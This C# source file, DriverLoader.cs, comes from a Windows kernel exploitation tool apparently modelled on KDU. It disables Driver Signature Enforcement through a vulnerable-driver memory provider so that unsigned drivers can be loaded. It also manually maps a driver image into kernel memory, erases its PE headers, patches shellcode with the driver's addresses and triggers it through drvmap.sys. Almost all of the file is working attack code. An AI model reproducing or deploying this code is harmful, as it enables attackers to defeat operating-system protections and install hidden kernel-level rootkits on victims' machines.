// File: Driver/DriverLoader.cs
// Project: KernelMode

using KernelMode.Providers;
using KernelMode.Utils;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Xml.Linq;

namespace KernelMode.Driver
{
	public static class DriverLoader
	{
		private const string DrvMapService = "drvmap";
		// Assuming the program runs from the KDU root, paths are relative to the /bin folder.
		private const string DrvMapPath = @"Drivers\drvmap.sys";
		private const string ShellcodePath = @"Shellcode\scv2.bin";

		private static KernelExportResolver _kernelExportResolver;

		private struct MappedImageInfo
		{
			public ulong BaseAddress;
			public ulong EntryPoint;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct SYSTEM_MODULE_INFORMATION
		{
			public uint NextOffset;
			public IntPtr Reserved1;
			public IntPtr Reserved2;
			public IntPtr ImageBase;
			public uint ImageSize;
			public uint Flags;
			public ushort LoadOrderIndex;
			public ushort InitOrderIndex;
			public ushort LoadCount;
			public ushort ModuleNameOffset;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
			public byte[] FullPathName;
		}

		[DllImport("ntdll.dll")]
		public static extern int NtQuerySystemInformation(int infoClass, IntPtr buffer, int length, out int returnLength);

		public static void LoadUnsignedDriver()
		{
			IProvider provider = KernelMemory.GetProvider();
			if (provider == null)
			{
				Console.WriteLine("[-] No active provider. DSE patching requires an active provider.");
				return;
			}

			Console.Write("Enter path to unsigned .sys driver to load: ");
			string driverPath = Console.ReadLine();
			if (!File.Exists(driverPath))
			{
				Console.WriteLine("[-] Driver file not found.");
				return;
			}

			string serviceName = Path.GetFileNameWithoutExtension(driverPath);

			if (!DsePatcher.Disable(provider))
			{
				Console.WriteLine("[-] Failed to disable DSE. Cannot load driver.");
				return;
			}

			Console.WriteLine($"[*] Attempting to load driver: {driverPath}");
			if (InstallDriver(serviceName, driverPath))
			{
				Console.WriteLine("[+] Driver service created and started successfully.");
				Console.WriteLine("[*] You can now interact with your driver.");
				Console.WriteLine("[*] Press any key to stop and unload the driver.");
				Console.ReadKey();
				UnloadDriver(serviceName);
				Console.WriteLine("[+] Driver unloaded.");
			}
			else
			{
				Console.WriteLine("[-] Failed to install or start the driver service.");
			}

			// Always attempt to restore DSE.
			DsePatcher.Enable(provider);
		}

		public static void LoadMappedBin()
		{
			Console.Write("Enter path to .bin driver to map (e.g. Drivers/gdrv.bin): ");
			string binPath = Console.ReadLine();
			if (!File.Exists(binPath))
			{
				Console.WriteLine("[-] .bin file not found.");
				return;
			}

			if (!InstallDriver(DrvMapService, DrvMapPath))
			{
				Console.WriteLine("[-] Failed to install drvmap.sys");
				return;
			}

			byte[] shellcode = File.ReadAllBytes(ShellcodePath);
			byte[] targetDriver = File.ReadAllBytes(binPath);

			IProvider provider = KernelMemory.GetProvider();
			if (provider == null)
			{
				Console.WriteLine("[-] No active provider.");
				UnloadDriver(DrvMapService);
				return;
			}

			if (!InitializeKernelExportResolver())
			{
				Console.WriteLine("[-] Failed to initialize kernel export resolver.");
				UnloadDriver(DrvMapService);
				return;
			}

			ulong shellcodeAddr = AllocateAndWrite(provider, shellcode);
			MappedImageInfo driverInfo = MapPEImage(provider, targetDriver);

			if (shellcodeAddr == 0 || driverInfo.BaseAddress == 0)
			{
				Console.WriteLine("[-] Failed to write shellcode or driver.");
				UnloadDriver(DrvMapService);
				return;
			}

			Console.WriteLine("[*] Shellcode written to: 0x" + shellcodeAddr.ToString("X"));
			Console.WriteLine("[*] Driver image written to: 0x" + driverInfo.BaseAddress.ToString("X"));
			Console.WriteLine("[*] Driver entry point at: 0x" + driverInfo.EntryPoint.ToString("X"));

			PatchShellcode(provider, shellcodeAddr, driverInfo.BaseAddress, driverInfo.EntryPoint);

			ulong drvmapBase = ResolveDrvMapBase();
			if (drvmapBase == 0)
			{
				Console.WriteLine("[-] Failed to locate drvmap.sys base address.");
				UnloadDriver(DrvMapService);
				return;
			}

			ulong callbackPointerAddr = drvmapBase + 0x3000; // known offset from symbol analysis
			TriggerDrvMap(provider, shellcodeAddr, callbackPointerAddr);

			Console.WriteLine("[+] Mapping attempted via drvmap");

			// Final cleanup
			UnloadDriver(DrvMapService);
			provider.Dispose(); // This should handle unloading the vulnerable driver
			Console.WriteLine("[+] Cleanup complete.");
		}

		private static bool InstallDriver(string serviceName, string driverPath)
		{
			if (!File.Exists(driverPath)) return false;
			Process.Start("sc", $"create {serviceName} type= kernel binPath= \"{Path.GetFullPath(driverPath)}\" start= demand").WaitForExit();
			Process.Start("sc", $"start {serviceName}").WaitForExit();
			// STUB: FIXME!! A more robust check would be needed here in a real application
			return true;
		}

		private static void UnloadDriver(string serviceName)
		{
			Console.WriteLine($"[*] Unloading driver service: {serviceName}");
			Process.Start("sc", $"stop {serviceName}").WaitForExit();
			Process.Start("sc", $"delete {serviceName}").WaitForExit();
		}

		private static MappedImageInfo MapPEImage(IProvider provider, byte[] image)
		{
			var result = new MappedImageInfo();
			const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
			const uint IMAGE_NT_SIGNATURE = 0x00004550;

			ushort dosSig = BitConverter.ToUInt16(image, 0);
			if (dosSig != IMAGE_DOS_SIGNATURE)
			{
				Console.WriteLine("[-] Invalid DOS signature.");
				return result;
			}

			int peHeaderOffset = BitConverter.ToInt32(image, 0x3C);
			uint ntSig = BitConverter.ToUInt32(image, peHeaderOffset);
			if (ntSig != IMAGE_NT_SIGNATURE)
			{
				Console.WriteLine("[-] Invalid NT signature.");
				return result;
			}

			int optionalHeaderOffset = peHeaderOffset + 24;
			short numberOfSections = BitConverter.ToInt16(image, peHeaderOffset + 6);
			int sizeOfOptionalHeader = BitConverter.ToInt16(image, peHeaderOffset + 20);
			int sectionTableOffset = optionalHeaderOffset + sizeOfOptionalHeader;
			ulong imageBase = BitConverter.ToUInt64(image, optionalHeaderOffset + 24);
			int sizeOfImage = BitConverter.ToInt32(image, optionalHeaderOffset + 56);
			int entryPointRva = BitConverter.ToInt32(image, optionalHeaderOffset + 16);
			int sizeOfHeaders = BitConverter.ToInt32(image, optionalHeaderOffset + 60);

			byte[] fullImage = new byte[sizeOfImage];
			Buffer.BlockCopy(image, 0, fullImage, 0, Math.Min(image.Length, sizeOfImage));

			for (int i = 0; i < numberOfSections; i++)
			{
				int entry = sectionTableOffset + (i * 40);
				int rawSize = BitConverter.ToInt32(image, entry + 16);
				int rawPointer = BitConverter.ToInt32(image, entry + 20);
				int virtAddr = BitConverter.ToInt32(image, entry + 12);
				int virtSize = BitConverter.ToInt32(image, entry + 8);

				if (rawSize > 0 && rawPointer > 0)
				{
					Buffer.BlockCopy(image, rawPointer, fullImage, virtAddr, Math.Min(rawSize, virtSize));
				}
			}

			ulong baseAddr = 0xFFFF800000000000;
			for (ulong addr = baseAddr; addr < baseAddr + 0x10000000; addr += 0x1000)
			{
				if (provider.WriteMemory(addr, fullImage, fullImage.Length))
				{
					Console.WriteLine("[+] PE image mapped at 0x" + addr.ToString("X"));
					result.BaseAddress = addr;
					result.EntryPoint = addr + (ulong)entryPointRva;
					ApplyRelocations(image, fullImage, imageBase, addr);
					ApplyImportTable(image, fullImage);
					ErasePEHeaders(provider, addr, (uint)sizeOfHeaders);
					return result;
				}
			}

			Console.WriteLine("[-] Failed to map PE image.");
			return result;
		}

		private static void ErasePEHeaders(IProvider provider, ulong imageBase, uint sizeOfHeaders)
		{
			Console.WriteLine("[*] Erasing PE headers from mapped driver...");
			byte[] zeros = new byte[sizeOfHeaders];
			if (!provider.WriteMemory(imageBase, zeros, zeros.Length))
			{
				Console.WriteLine("[-] Failed to erase PE headers.");
			}
			else
			{
				Console.WriteLine("[+] PE headers erased.");
			}
		}

		private static void ApplyRelocations(byte[] originalImage, byte[] mappedImage, ulong originalBase, ulong newBase)
		{
			const int IMAGE_DIRECTORY_ENTRY_BASERELOC = 5;
			int peHeaderOffset = BitConverter.ToInt32(originalImage, 0x3C);
			int relocRva = BitConverter.ToInt32(originalImage, peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8));
			int relocSize = BitConverter.ToInt32(originalImage, peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_BASERELOC * 8) + 4);

			if (relocRva == 0 || relocSize == 0) return;

			int offset = RvaToOffset(originalImage, relocRva);
			ulong delta = newBase - originalBase;

			while (offset < originalImage.Length && relocSize > 0)
			{
				int pageRva = BitConverter.ToInt32(originalImage, offset);
				int blockSize = BitConverter.ToInt32(originalImage, offset + 4);
				int entryCount = (blockSize - 8) / 2;

				for (int i = 0; i < entryCount; i++)
				{
					ushort entry = BitConverter.ToUInt16(originalImage, offset + 8 + i * 2);
					int type = (entry >> 12);
					int rvaOffset = entry & 0xFFF;

					if (type == 0) continue; // skip ABSOLUTE

					int relocOffset = RvaToOffset(originalImage, pageRva + rvaOffset);
					ulong origValue = BitConverter.ToUInt64(mappedImage, relocOffset);
					ulong newValue = origValue + delta;
					Buffer.BlockCopy(BitConverter.GetBytes(newValue), 0, mappedImage, relocOffset, 8);
				}

				offset += blockSize;
				relocSize -= blockSize;
			}
		}

		private static int RvaToOffset(byte[] image, int rva)
		{
			int peHeaderOffset = BitConverter.ToInt32(image, 0x3C);
			short numberOfSections = BitConverter.ToInt16(image, peHeaderOffset + 6);
			int sizeOfOptionalHeader = BitConverter.ToInt16(image, peHeaderOffset + 20);
			int sectionTableOffset = peHeaderOffset + 24 + sizeOfOptionalHeader;

			for (int i = 0; i < numberOfSections; i++)
			{
				int entry = sectionTableOffset + (i * 40);
				int virtAddr = BitConverter.ToInt32(image, entry + 12);
				int rawPtr = BitConverter.ToInt32(image, entry + 20);
				int rawSize = BitConverter.ToInt32(image, entry + 16);

				if (rva >= virtAddr && rva < virtAddr + rawSize)
					return rawPtr + (rva - virtAddr);
			}

			return rva;
		}

		private static void ApplyImportTable(byte[] originalImage, byte[] mappedImage)
		{
			const int IMAGE_DIRECTORY_ENTRY_IMPORT = 1;
			int peHeaderOffset = BitConverter.ToInt32(originalImage, 0x3C);
			int importRva = BitConverter.ToInt32(originalImage, peHeaderOffset + 24 + 112 + (IMAGE_DIRECTORY_ENTRY_IMPORT * 8));
			if (importRva == 0) return;

			int offset = RvaToOffset(originalImage, importRva);
			while (true)
			{
				int originalFirstThunk = BitConverter.ToInt32(originalImage, offset);
				int nameRva = BitConverter.ToInt32(originalImage, offset + 12);
				int firstThunk = BitConverter.ToInt32(originalImage, offset + 16);
				if (originalFirstThunk == 0 && nameRva == 0 && firstThunk == 0)
					break;

				int nameOffset = RvaToOffset(originalImage, nameRva);
				string dllName = ReadNullTerminatedString(originalImage, nameOffset);
				Console.WriteLine("[*] Import DLL: " + dllName);

				int thunkOffset = RvaToOffset(originalImage, firstThunk);
				while (true)
				{
					ulong thunkData = BitConverter.ToUInt64(originalImage, thunkOffset);
					if (thunkData == 0) break;

					if ((thunkData & 0x8000000000000000) == 0) // Not an ordinal
					{
						int importByNameRva = (int)(thunkData & 0xFFFFFFFF);
						int hintNameOffset = RvaToOffset(originalImage, importByNameRva + 2);
						string funcName = ReadNullTerminatedString(originalImage, hintNameOffset);
						Console.WriteLine($"    - {funcName}");

						ulong resolved = ResolveKernelExport(funcName);
						if (resolved == 0)
						{
							Console.WriteLine($"[-] Failed to resolve import: {funcName}");
						}
						Buffer.BlockCopy(BitConverter.GetBytes(resolved), 0, mappedImage, thunkOffset, 8);
					}
					thunkOffset += 8;
				}

				offset += 20;
			}
		}

		private static string ReadNullTerminatedString(byte[] buffer, int offset)
		{
			int end = Array.IndexOf(buffer, (byte)0, offset);
			if (end == -1) end = buffer.Length;
			return Encoding.ASCII.GetString(buffer, offset, end - offset);
		}

		private static bool InitializeKernelExportResolver()
		{
			string ntoskrnlPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "ntoskrnl.exe");
			if (!File.Exists(ntoskrnlPath))
			{
				Console.WriteLine("[-] ntoskrnl.exe not found in System32.");
				return false;
			}

			byte[] ntoskrnlImage = File.ReadAllBytes(ntoskrnlPath);
			ulong ntoskrnlBase = GetNtoskrnlBase();
			if (ntoskrnlBase == 0)
			{
				Console.WriteLine("[-] Failed to get ntoskrnl.exe base address.");
				return false;
			}

			_kernelExportResolver = new KernelExportResolver(ntoskrnlImage, ntoskrnlBase);
			return true;
		}

		private static ulong ResolveKernelExport(string name)
		{
			if (_kernelExportResolver == null)
			{
				Console.WriteLine("[!] Kernel export resolver not initialized.");
				return 0;
			}
			return _kernelExportResolver.Resolve(name);
		}

		private static void PatchShellcode(IProvider provider, ulong shellcodeAddr, ulong driverBase, ulong driverEntry)
		{
			// Patches the shellcode (e.g., scv2.bin) with the necessary addresses.
			// The shellcode expects the driver base address in RCX and the entry point in RAX.
			// From ScV2.cs:
			// offset 6: mov rcx, <param> (driverBase)
			// offset 16: mov rax, <DriverEntry>

			byte[] basePatch = BitConverter.GetBytes(driverBase);
			if (!provider.WriteMemory(shellcodeAddr + 6, basePatch, basePatch.Length))
			{
				Console.WriteLine("[-] Failed to patch shellcode with driver base address.");
			}

			byte[] entryPatch = BitConverter.GetBytes(driverEntry);
			if (!provider.WriteMemory(shellcodeAddr + 16, entryPatch, entryPatch.Length))
			{
				Console.WriteLine("[-] Failed to patch shellcode with driver entry point.");
			}
		}

		private static ulong GetNtoskrnlBase()
		{
			const int SystemModuleInformation = 11;
			int length = 0;
			NtQuerySystemInformation(SystemModuleInformation, IntPtr.Zero, 0, out length);
			if (length == 0) return 0;

			IntPtr buffer = Marshal.AllocHGlobal(length);
			if (NtQuerySystemInformation(SystemModuleInformation, buffer, length, out _) != 0)
			{
				Marshal.FreeHGlobal(buffer);
				return 0;
			}

			long count = Marshal.ReadIntPtr(buffer).ToInt64();
			IntPtr current = new IntPtr(buffer.ToInt64() + IntPtr.Size);
			for (int i = 0; i < count; i++)
			{
				var entry = Marshal.PtrToStructure<SYSTEM_MODULE_INFORMATION>(current);
				string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0').ToLower();
				if (name.EndsWith("ntoskrnl.exe"))
				{
					Marshal.FreeHGlobal(buffer);
					return (ulong)entry.ImageBase.ToInt64();
				}
				if (entry.NextOffset == 0) break;
				current = new IntPtr(current.ToInt64() + entry.NextOffset);
			}

			Marshal.FreeHGlobal(buffer);
			return 0;
		}

		private static ulong ResolveDrvMapBase()
		{
			const int SystemModuleInformation = 11;
			int length = 0;
			NtQuerySystemInformation(SystemModuleInformation, IntPtr.Zero, 0, out length);
			if (length == 0) return 0;

			IntPtr buffer = Marshal.AllocHGlobal(length);
			if (NtQuerySystemInformation(SystemModuleInformation, buffer, length, out _) != 0)
			{
				Marshal.FreeHGlobal(buffer);
				return 0;
			}

			long count = Marshal.ReadIntPtr(buffer).ToInt64();
			IntPtr current = new IntPtr(buffer.ToInt64() + IntPtr.Size);
			for (int i = 0; i < count; i++)
			{
				var entry = Marshal.PtrToStructure<SYSTEM_MODULE_INFORMATION>(current);
				string name = Encoding.ASCII.GetString(entry.FullPathName).TrimEnd('\0');
				if (name.ToLower().Contains("drvmap"))
				{
					Marshal.FreeHGlobal(buffer);
					return (ulong)entry.ImageBase.ToInt64();
				}
				if (entry.NextOffset == 0) break;
				current = new IntPtr(current.ToInt64() + entry.NextOffset);
			}

			Marshal.FreeHGlobal(buffer);
			return 0;
		}

		static void TriggerDrvMap(IProvider provider, ulong shellcodeAddr, ulong callbackPointerAddr)
		{
			byte[] ptrBytes = BitConverter.GetBytes(shellcodeAddr);

			if (!provider.WriteMemory(callbackPointerAddr, ptrBytes, ptrBytes.Length))
			{
				Console.WriteLine("[-] Failed to write shellcode pointer to drvmap.");
				return;
			}

			Console.WriteLine("[*] Shellcode address written to drvmap global pointer.");
			TriggerExecution();
		}

		static void TriggerExecution()
		{
			try
			{
				using (var device = NativeMethods.CreateFile("\\\\.\\DRVMAP",
					NativeMethods.GENERIC_READ | NativeMethods.GENERIC_WRITE,
					0, IntPtr.Zero, NativeMethods.OPEN_EXISTING, 0, IntPtr.Zero))
				{
					if (device.IsInvalid)
					{
						Console.WriteLine("[-] Failed to open drvmap device.");
						return;
					}

					int ret;
					NativeMethods.DeviceIoControl(device, 0x222003, IntPtr.Zero, 0, IntPtr.Zero, 0, out ret, IntPtr.Zero);
					Console.WriteLine("[+] Triggered drvmap execution.");
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("[-] Error triggering shellcode: " + ex.Message);
			}
		}
		// Add this method to the DriverLoader class			
		private static ulong AllocateAndWrite(IProvider provider, byte[] data)
		{
			// Try to find a suitable address in kernel memory to write the data
			ulong baseAddr = 0xFFFF800000000000;
			for (ulong addr = baseAddr; addr < baseAddr + 0x10000000; addr += 0x1000)
			{
				if (provider.WriteMemory(addr, data, data.Length))
				{
					return addr;
				}
			}
			return 0;
		}
    	}
    }
